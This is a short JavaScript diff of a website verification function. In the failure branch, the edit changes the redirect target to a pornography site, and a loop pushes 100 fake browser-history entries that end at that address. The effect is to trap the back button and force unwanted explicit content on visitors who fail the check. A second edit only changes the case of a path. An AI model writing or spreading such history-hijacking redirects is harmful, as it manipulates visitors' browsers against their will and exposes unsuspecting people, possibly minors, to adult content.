@@ -18,7 +18,7 @@ function sus() {
       // If they match, open youtube.com in a new window
 
       Cookies.set('Verifide', 'true', { expires: 1 })
-      window.open('sub/index.html', '_blank');
+      window.open('Sub/index.html', '_blank');
 
     } else {
       
@@ -27,7 +27,7 @@ function sus() {
         Cookies.set('Verifide', 'close', { expires: 1 })
         var num=100;
         done=false;
-        let x='https://digitalserpant.github.io/OurHarmonyP/';
+        let x='https://pornhub.com/';
         Cookies.set('Verifide', 'close', { expires: 8 })
         for (var i=1; i<=num; i++){
            history.pushState(0, 0, i==num?x:i.toString());
